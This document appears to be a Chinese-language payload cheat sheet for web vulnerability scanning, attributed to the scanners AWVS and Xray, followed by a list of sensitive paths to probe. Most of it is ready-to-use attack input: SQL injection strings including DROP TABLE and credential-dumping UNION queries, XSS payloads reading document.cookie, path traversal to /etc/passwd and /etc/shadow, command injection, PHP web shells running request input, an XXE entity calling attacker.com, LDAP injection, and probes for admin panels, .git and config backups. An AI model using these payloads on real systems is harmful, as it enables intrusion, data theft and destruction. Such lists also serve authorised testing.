````
1 AWVS的payload  
1.1 SQL注入  
' OR 1=1--
' OR '1'='1'--
'; DROP TABLE users--
' UNION SELECT * FROM users--
' AND 1=0 UNION ALL SELECT username,password FROM users--
%0a' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,
' or 1=1#
' or 'a'='a
' union select 1,2,3--
' UNION SELECT NULL, username || ':' || password, NULL FROM users--

1.2 跨站脚本攻击（XSS）
<script>alert("XSS");</script>
<script>alert(document.cookie);</script>
<img src="javascript:alert('XSS');">
<iframe src="javascript:alert('XSS');"></iframe>
<svg/onload=alert('XSS')>

1.3 文件包含漏洞
/etc/passwd
../../../../etc/passwd
../../../etc/passwd
../../../../../../../etc/passwd
../../../etc/shadow
../../../../../../../etc/shadow

1.4 远程命令执行
; ls -la
; cat /etc/passwd
; netstat -an
; uname -a
; id
; whoami

1.5 文件上传漏洞
文件名: shell.php
内容: <?php phpinfo(); ?>
文件名: shell.php.gif
内容: <?php system($_GET['cmd']); ?>

1.6 XML实体注入
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com">]><test>&xxe;</test>
<root><![CDATA[<%00>%0d%0a<%00>]]></root>

1.7 目录遍历
/etc/passwd
../../../../../../../etc/passwd
../../../etc/shadow
../../../../../../../etc/shadow
/var/www/html/index.php
../../../var/www/html/index.php

1.8 LDAP注入
username=)(uid=))(|(uid=*
username=admin*)(uid=))(|(uid=
username=admin)(uid=))(|(uid=
username=admin*)(uid=*
username=*)(uid=admin

````
````
2.Xray的payload
2.1 SQL注入Payload：
' or '1'='1
' or 1=1--
' or 1=1#
' or 1=1/*
';SELECT * FROM users WHERE username='admin' AND password LIKE '%'
' or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- -

2.2 XSS Payload：
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<svg/onload=alert(document.cookie)>
<img src=x onerror=alert(document.cookie)>
<iframe src="javascript:alert(document.cookie)"></iframe>

2.3 文件上传Payload：
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

2.3 命令注入Payload：
; ls -al
| ls -al
& ls -al
| id
; id

2.4 jsonp
/?callback=<script>alert('XRAY attack')</script>
/?callback=<img src=x onerror=alert('XRAY attack')>
/?callback=<iframe src=javascript:alert('XRAY attack')></iframe>
/?callback=<svg/onload=alert('XRAY attack')>
/?callback=<video src=1 onerror=alert('XRAY attack')>
/?callback=<audio src=1 onerror=alert('XRAY attack')>
/?callback=<body onload=alert('XRAY attack')>
/?callback=<style onload=alert('XRAY attack')>
/?callback=<marquee/onstart=alert('XRAY attack')>
/?callback=<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFJheSBhdHRhY2snKTwvc2NyaXB0Pg==></object>

````
```bigquery

robots.txt 将查找目标网站上的robots.txt文件以了解哪些页面可以被搜索引擎爬取
/admin/ 将检查是否存在管理员控制面板
/login/ 将检查是否存在登录页面
/wp-admin/ 将检查WordPress网站是否有管理员登录页面
/xmlrpc.php 将尝试使用XML-RPC协议进行WordPress攻击
/phpinfo.php 将尝试查找phpinfo.php文件，以了解目标网站的PHP配置
/test.php 将尝试查找test.php文件，以检测是否存在远程代码执行漏洞
/.git/ 将检查是否存在Git源代码管理系统，如果存在，则可以发现敏感信息，如密码和API密钥
/backup/ 将检查是否存在备份文件或目录，可能会包含敏感信息
/api/ 将检查是否存在API端点，可能存在漏洞或可滥用的功能
/admin/login.php 将尝试找到管理员登录页面，以进行登录漏洞检测
/cgi-bin/ 将检查是否存在CGI脚本，可能存在命令注入漏洞
/index.php 将检查网站首页是否存在安全漏洞
/phpMyAdmin/ 将检查是否存在phpMyAdmin管理页面，可能存在SQL注入漏洞
/inc/ 将检查是否存在包含敏感信息的配置文件或库文件
/uploads/ 将检查是否存在文件上传功能，可能存在文件上传漏洞
/etc/passwd 将尝试访问/etc/passwd文件，以了解系统用户信息
/proc/self/environ 将尝试访问/proc/self/environ文件，以了解系统环境变量
/README.md 将尝试查找README文件，可能会包含敏感信息
/server-status 将检查是否存在Apache服务器状态页面，可能会包含敏感信息
/admin.php
/login.php
/wp-login.php
/xmlrpc
/info.php
/phpinfo
/test
/admin/login
/admin/login.aspx
/admin/index.php
/cgi-bin/test-cgi
/test2.php
/config.php
/php.ini
/phpMyAdmin/index.php
/phpmyadmin/index.php
/phpmyadmin/
/mysql/admin
/mysql/admin.php
/sql.php
/adminpanel/
/loginadmin/
/wp-admin/admin-ajax.php
/wp-login/
/wp-login.php?action=register
/wp-login.php?action=lostpassword
/wp-config.php.bak
/phpmyadmin/db_structure.php
/phpmyadmin/db_search.php
/phpmyadmin/db_sql.php
```